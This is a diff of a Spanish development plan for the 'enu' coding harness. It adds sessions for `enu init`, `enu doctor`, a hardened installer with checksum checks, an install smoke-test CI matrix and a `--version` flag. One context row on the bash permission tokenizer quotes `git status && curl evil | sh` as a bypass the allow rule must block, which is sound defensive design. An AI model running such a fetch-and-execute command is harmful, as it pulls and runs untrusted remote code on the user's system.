@@ -152,6 +152,9 @@ sesión antes de cerrarla:
 | 🔒 **G53 (extensión)** | Tokenizador/máquina de estados de permisos de `bash` (`decompose_bash`/`match_bash`, agente.md §5, ADR-023): `allow` concede SOLO si CADA subcomando casa un patrón —`bash:git *` NO concede `git status && curl evil \| sh` (cierra la frontera falsa SEC-02)—; cada operador del contrato (`&&`, `\|\|`, `;`, `\|`, `\|&`, `&`, salto de línea) fuera de comillas separa; `deny` casa si ALGÚN subcomando casa (precedencia absoluta); todo constructo NO MODELABLE (`$( )`, backticks —también dentro de comillas dobles—, `$VAR` en posición de comando, redirecciones, heredocs, subshells/agrupaciones, comillas desbalanceadas) cae FAIL-CLOSED a `ask` (deny en headless), nunca concede (P17); el escape `\` no engaña al rastreador de separadores. El núcleo `deny→allow` se blinda table-driven en `_policy_decision` — tests propios (`agent_g53_test.go`). |
 | 🔒 **G54 (kernel)** | Política de redirects del kernel HTTP (`withRedirectPolicy`/`isCrossHost`, api.md §8; sube `APILevel` a 4): presupuesto `max_redirects` respetado y, al agotarlo, la última `3xx` entregada como DATO (no lanza); `0` = no seguir ninguno; en cada salto **cross-host** (host distinto —nombre y puerto, plegando el default del esquema— o degradación `https`→`http`) se recortan TODAS las cabeceras del llamante, sin lista blanca y sin restaurarlas aunque un salto posterior regrese al host inicial; el upgrade same-host `http`→`https` NO es cross-host (redirect benigno); la política vive en una copia por petición del cliente (no muta el cliente compartido). Cubre `request` y `stream` — tests propios (`http_g54_test.go`). |
 | 🔒 **G57 (kernel)** | `enu.fs.write{ mode }` fija el modo con chmod **no recortado por el umask** (sube `APILevel` a 5), en ambas direcciones (umask laxo no deja el fichero legible por otros; umask estricto no recorta un modo permisivo), componible con `exclusive`, y ganando sobre la preservación del previo en la sobrescritura; `opts.mode` inválido → `EINVAL`. La extensión `sessions` escribe transcript y lock en `0600` (`fs_test.go`; e2e `sessions_test.go`/`chat_test.go` des-amañados: aserción de modo real bajo el umask heredado). |
+| 🔒 **S49** | `enu init` **jamás sobrescribe** un fichero de config existente, en ningún modo ni con `--yes` (pérdida silenciosa de config del usuario = el fallo de borde); semántica por fichero: sobre config parcial escribe exactamente los que faltan; `init --yes`/sin-TTY y `--default-config` producen bytes idénticos (la equivalencia de ADR-026 pieza 2 es un contrato, no una intención); códigos 0 (éxito/no-op), 1, 2. |
+| 🔒 **S50** | `enu doctor`: cada check KERNEL de `doctor.v1` tiene caso verde y caso rojo table-driven (los 4 de producto son `skip` fijo en v1, G62); exit 1 si CUALQUIER check falla (y 0 con `skip`s presentes — los `skip` no ensucian); el valor de la clave **jamás** aparece en ninguna salida (humana ni `--json`, ni en `detail`/`remedy` — la fuga de secretos es el fallo silencioso perfecto); el `--json` valida contra el esquema congelado en doctor.md. |
+| 🔒 **S51** | Verificación de checksum en **Go compartido** (`update` + la que consume `install.sh`): artefacto corrupto o `checksums.txt` ausente → no se toca el binario instalado (instalar un binario corrupto es el fallo silencioso por antonomasia); reemplazo atómico del binario **en uso** (escribir-al-lado + rename; bordes ETXTBSY/cross-device); reinstalar la misma versión = no-op honesto; `uninstall` nunca toca `data_dir()`; destino no escribible → aborta con remedio, jamás eleva privilegios. |
 
 Las sesiones **fuera** de esta lista (S01, S03, S05, S12, S17, S19, S21, S24,
 S26, S28, S30, S32, S33 y las de extensiones Lua de la Fase 8) se cierran con
@@ -441,6 +444,85 @@ La Fase 8 es larga, así que lleva checkpoints **internos**, no solo al cierre:
 > humo: una sesión de chat real de extremo a extremo contra un provider real.
 > A partir de aquí, el resto del trabajo (repl, CLI, más adaptadores) puede
 > hacerse con el propio enu — la señal de que el harness ya se sostiene.
+
+## Fase 9 — Producto (ADR-025, Fase 1: demostrar la promesa operativa)
+
+La primera fase post-kernel: no construye features de runtime sino la
+**promesa operativa** del reposicionamiento
+([ADR-025](../decisions/adr/adr-025-reposicionamiento-motor-de-harnesses.md),
+pieza 3, Fase 1), que ordena expresamente que estas capacidades entren al plan
+por `/planificar-sesion`. Ninguna sesión de esta fase toca `api.md` ni el
+kernel.
+
+**DoD propio de las sesiones editoriales (S46-S48)** (sustituye para ellas al
+Contrato de sesión general, que presupone código de runtime): una de esas
+sesiones está hecha cuando (1) su criterio de hecho se cumple de forma
+**observable** (el artefacto publicado contiene lo exigido y no contiene lo
+excluido); (2) los gates existentes que toque siguen en verde (`go build
+./...` si toca el árbol Go, los gates de la web —check-drift, i18n— si toca
+`web/`, la CI si toca workflows); (3) el frente público resultante está **en
+inglés** y la fuente interna en español (ADR-025, pieza 5); y (4) cierra con
+puntero ▶ avanzado y fila de bitácora en el mismo commit, registrando en
+`docs/worklog/sNN-*.md` las decisiones bajo umbral. S46-S48 no aportan filas
+🔒 (no hay lógica de runtime; los workflows de CI son steps, no lógica — sus
+*decisiones* se registran, ver S48). **Las sesiones de subcomandos
+(S49-S51)** son código Go/shell: se rigen por el **Contrato de sesión
+general** y sí alimentan el inventario 🔒 (sus filas, abajo).
+
+| Sesión | Feature | Depende de | Espec | Criterio de hecho |
+|---|---|---|---|---|
+| **S46** | **README raíz en inglés** según ADR-025: hero directo («a self-extensible coding harness shipped as a single static binary»), quickstart de 3 comandos, diagrama de capas kernel/API/plugins, plugin de ejemplo ~10 líneas, tabla comparativa **con Pi** (honesta: admite madurez/ecosistema superiores), bloque de estado breve y rutas de doc por intención del lector. Elimina del camino de entrada: «45 sesiones cerradas», «la release va por detrás», el CTA a la competencia y el pseudocódigo-como-validación (se enlazan, no se reproducen). Actualiza `filosofia.md` a la tesis de la pieza 1 — **en español** (es fuente interna; puede citar el lema inglés). | — | ADR-025 piezas 1-2 y 5 · [auditoría externa 2026-07-18](../audits/auditoria-externa-concepto-2026-07-18.md) §triaje | El README publicado contiene los siete elementos y ninguno de los cuatro eliminados; `filosofia.md` coherente con ADR-025; versión española enlazada. |
+| **S47** | **Copy de la web a la tesis nueva + legibilidad**: la copy pública (i18n de la portada: slogan/cuerpo es+en) y las páginas `que-es-enu`/`primer-agente` (es/en) se actualizan a la tesis de ADR-025 (motor de harnesses); y la legibilidad de doc larga en `markdown.css` (cuerpo 15-16px, más contraste, ancho de texto 70-75 col). **No** se añade ningún theme (congelación de ADR-025). **Toda la pasada VISUAL de la portada** (demo del hero, snippet de plugin, jerarquía de enlaces primarios sobre atajos, slot de demo) **se descopó a [P43](../postponed/pospuesto.md)** (operador, 2026-07-18): es diseño entrelazado con la demo, que se hace en una sola pasada al final con `forge`+`enu init`. S47 se queda con lo que es coherencia y legibilidad, sin riesgo de diseño. | S46 (el copy nuevo manda) | ADR-025 pieza 3 (Fase 1) y consecuencias · auditoría externa §web | La copy de la portada y las dos páginas reflejan la tesis de motor de harnesses (es+en); la legibilidad de doc larga aplicada; gates de la web (check-drift, i18n) en verde; cero themes nuevos. |
+| **S48** | **Matriz de smoke tests de instalación en sistemas limpios**: workflow de CI que mete el binario estático en contenedores mínimos SIN toolchain y ejecuta el humo. Humo (al darse de alta esta sesión NO existía `--version` —llega en S53—; y aun con él, el humo usa `enu -e` a propósito, porque **arranca el runtime**: liveness más fuerte que un print estático de versión): `enu -e 'return enu.version.api'` (arranca el runtime headless, imprime el nivel de API), `enu --default-config` (escribe el conjunto oficial y sale 0), y un segundo `enu -e` con el oficial ya activo. **Matriz cerrada en este alta** (decisión, no step): `debian:stable-slim`, `ubuntu:latest`, `fedora:latest`, `alpine:latest` (sí aplica: binario estático `CGO_ENABLED=0`, ADR-001 — prueba que no hay dependencia de glibc) + macOS ARM (`macos-14`; Intel `macos-13` **descartado** — hardware legacy y runners escasos que encolan la matriz; quien siga en Mac Intel casi siempre corre Linux encima, ya cubierto). Publica el resultado como dato (JSON + resumen). Las decisiones de tubería se registran en el `worklog` de la sesión como refinamiento de ADR-013 (los steps siguen sin ser API). | — | ADR-013 (CI/releases) · ADR-025 pieza 3 (Fase 1) | El workflow corre la matriz completa en verde; un fallo de arranque en cualquier plataforma pone la CI en rojo; la matriz es visible como dato. |
+| **S49** | **`enu init`** — primer subcomando del binario (ADR-026, piezas 1-2): asistente TTY (provider → clave por `api_key_env`, jamás en fichero → modelo → conjunto oficial), semántica **por fichero** de ADR-017 (escribe los que faltan, respeta y lista los existentes; no-op honesto con config completa), sin TTY o `--yes` = equivalente exacto de `--default-config`, códigos 0/1/2, sin red. Incluye el dispatcher de subcomandos de la pieza 1 (regla de frontera gestión/producto). **El wizard v1 ofrece solo `anthropic`** ([G61](../findings/g61-el-wizard-de-init-ofrece-providers-sin-plantilla.md): los otros tres providers no tienen plantilla; diferidos como P44). | — | ADR-026 piezas 1-2 (+ ADR-015/017, cuyas primitivas y plantillas reutiliza) · G61 | `enu init` en TTY limpio deja el harness usable (tres ficheros + mensaje honesto); sobre config parcial escribe solo lo que falta; `enu init --yes` y `enu --default-config` producen ficheros idénticos. |
+| **S50** | **`enu doctor`** (ADR-026, pieza 3): batería de checks de solo lectura sin red por defecto (`--net` opt-in), salida humana + `--json` conforme a **`doctor.v1`** ([docs/ops/doctor.md](../ops/doctor.md), el catálogo de `id` congelado), códigos 0/1/2, remedio accionable por fallo. **Estrechada por [G62](../findings/g62-los-checks-de-producto-de-doctor-presuponen-introspeccion-inexistente.md): v1 implementa los 7 checks KERNEL** (`binary.version`, `config.dir`, `config.parse`, `sessions.perms`, `tty.caps`, `plugins.enabled`, `plugins.requires`); los 4 de PRODUCTO (`provider.model`/`provider.key`/`tools.external`/`provider.reach`) salen como `skip` con remedy→G62 (necesitan introspección de extensiones que no existe, diferida como P45). `plugins.enabled/requires` exponen un método del Runtime que envuelve `discover()`+`topoSort()` **sin `Boot()`** (reusa el loader, no re-implementa). | S49 (dispatcher de subcomandos) | ADR-026 pieza 3 · [doctor.md](../ops/doctor.md) · G62 | `enu doctor` sobre config sana da 0 con los 7 kernel `ok` y los 4 de producto `skip`; romper cada área kernel produce su `fail` con remedio; `--json` valida contra `doctor.v1`; la clave jamás aparece en ninguna salida. |
+| **S51** | **Instalador endurecido + `enu update`/`enu uninstall`** (ADR-026, piezas 4-5; espec operativa en [release.md](../ops/release.md) §Instalador): checksum obligatorio, `ENU_VERSION`/`ENU_INSTALL_DIR`, sin sudo, aviso de PATH, reemplazo atómico; `update` aborta con remedio en destinos no escribibles (gestor ajeno); `uninstall --purge` borra solo `config.dir()`, `data_dir()` intocable. La verificación de checksum se implementa **en Go compartido** (la usa `update`; `install.sh` queda fino) con unitario table-driven; la matriz de S48 hace de humo del camino shell e incluye el caso de checksum corrupto. | S48, S49 | ADR-026 piezas 4-5 · release.md §Instalador | `update` con checksum corrupto no toca el binario; `update` en destino no escribible aborta con remedio; reinstalar la misma versión es no-op; `uninstall` deja `data_dir()` intacto; el caso checksum-corrupto está en la matriz de S48. |
+| **S52** | **Limpieza nu→enu en las traducciones inglesas de la web** (residuo del renombrado [ADR-022](../decisions/adr/adr-022-renombrado-total-del-proyecto.md) que la [auditoría de renombrado 2026-07-16](../audits/auditoria-renombrado-2026-07-16.md) no alcanzó en `web/src/content/en/`). Detectado en S47. Alcance: `en/wiki/*` (filosofia, guia-plugins, arquitectura, providers, chat, sesiones, agente) y `en/referencia/*` (codecs, events, red): nombres de comando `nu →enu`, rutas `.nu/ → .enu/`, títulos `# nu → # enu`, ejemplos de slug (`/home/diego/nu`). **Editorial y mecánica**, exenta de la puerta SDD/juez de filosofía (su «espec» es ADR-022: todo es `enu`); **verificar cada aparición** para no pisar tokens legítimos (`menu`, `gnu`, `enu.*`, salidas de ejemplo donde `nu` sea correcto). Independiente: sin dependencias, puede hacerse sola o junto a la pasada visual de la portada (P43, misma zona `web/`). | — | ADR-022 (renombrado) · auditoría de renombrado 2026-07-16 | `grep -rE "\bnu\b" web/src/content/en/` sin apariciones de `nu` como producto (solo falsos positivos verificados); las páginas en inglés hablan de `enu` en todas partes; gates de la web en verde. |
+
+> 🔎 **CP-12 · El camino del desconocido** (cierre de fase, tras S46-S51; S52 es
+> limpieza ortogonal, no bloquea el cierre).
+> Prueba de humo de extremo a extremo del funnel completo: partiendo solo del
+> README nuevo, seguir el quickstart al pie de la letra en un contenedor
+> limpio de la matriz de S48 — instalador con verificación incluida y `enu
+> init` como primer contacto — y llegar a un `enu` funcional (headless si no
+> hay credenciales), con `enu doctor` en verde como comprobación final. Si
+> algún paso del README no se sostiene contra el binario real, la fase no
+> cierra. Es la versión operativa del CP-11: el dogfooding era «enu se
+> construye con enu»; este es «enu se adopta sin ayuda».
+>
+> **Mutación 🔒 batcheada al cierre de fase** (decisión del operador,
+> 2026-07-18): las sesiones de código 🔒 de la Fase 9 (S49, S50, S51) difieren
+> su pasada de `/mutacion` individual y la corren **juntas aquí**, en CP-12,
+> sobre `init.go` + los subcomandos + los helpers de runtime que añadieron
+> (`WriteInitConfig`, doctor, verificación de checksum). Cada sesión lo anota
+> en su worklog como deuda; CP-12 la salda antes de cerrar la fase. Un mutante
+> LIVED: o test nuevo que lo mata, o anotado como equivalente.
+
+**Puerta SDD de los subcomandos: cruzada.** `enu init`, `enu doctor` y el
+instalador endurecido quedaron fuera del alta original de esta fase por falta
+de espec; el diseño se hizo después por la vía canónica —
+[ADR-026](../decisions/adr/adr-026-subcomandos-de-gestion-del-binario.md)
+(que ejecuta el disparador de reapertura de ADR-015/017),
+[release.md](../ops/release.md) §Instalador y [doctor.md](../ops/doctor.md)
+(esquema `doctor.v1`), todos de 2026-07-18 — y S49-S51 entraron entonces por
+`/planificar-sesion` con juicio de filosofía (dos bloqueantes y cinco
+advertencias, incorporadas a los enunciados y a los propios documentos de
+espec).
+
+## Fase 10 — Convenciones CLI (post-adquisición)
+
+El plan de construcción (Fases 0-9) está **completo**: el kernel y las
+extensiones oficiales están construidos y el frente de adquisición (ADR-025) en
+pie. Esta fase no añade capacidades del kernel ni de producto: recoge
+**convenciones de CLI que el USO real destapa** —lo que un usuario espera de
+cualquier binario y `enu` aún no da—. Entra por `/planificar-sesion` como
+cualquier capacidad nueva; su superficie vive en el binario (`main.go`), NO en
+`api.md` (que queda intacto). La primera la levantó el operador al notar que
+faltaba el afijo de versión más convencional.
+
+| Sesión | Feature | Depende de | Espec | Criterio de hecho |
+|---|---|---|---|---|
+| **S53** | **Flag `--version`/`-V`**: imprime la identidad del binario a stdout —`enu <major>.<minor>.<patch> · API <n> (<os>/<arch>)`, reutilizando el formato que `checkBinaryVersion` (doctor) ya compone— y sale **0**, **sin arrancar el runtime ni leer config** (corre en un binario desnudo). Lee `enu.version` (api.md) + `runtime.GOOS/GOARCH` de Go; **no toca `api.md`** (`enu.version.api` no se mueve). **Es un flag, no el subcomando `enu version`** (decisión del operador tras la objeción del juez de filosofía): `--version` es un **meta-flag de introspección universal y sin efectos**, la categoría de `--help`/`-h`, distinta de los **verbos de acción** de gestión de ADR-026 (`init`/`doctor`/`update`/`uninstall`); la frontera de ADR-026 gobierna esos verbos, no la categoría meta. Justificación citada en [arquitectura.md](../core/arquitectura.md) §5. | S45 (superficie CLI) | [arquitectura.md](../core/arquitectura.md) §5 (superficie CLI, con la línea de `--version` añadida en este alta) · [api.md](../contracts/api.md) §`enu.version` (el dato) | `enu --version` y `enu -V` imprimen `enu <semver> · API <n> (<os>/<arch>)` a stdout y salen 0; funcionan en un binario **sin config** (no arrancan el runtime); no regresionan los demás flags (`-e`/`-p`/… intactos). Sin fila 🔒 (formatea constantes; wrapper fino, test unitario basta). |
 
 ## Hitos de validación
 
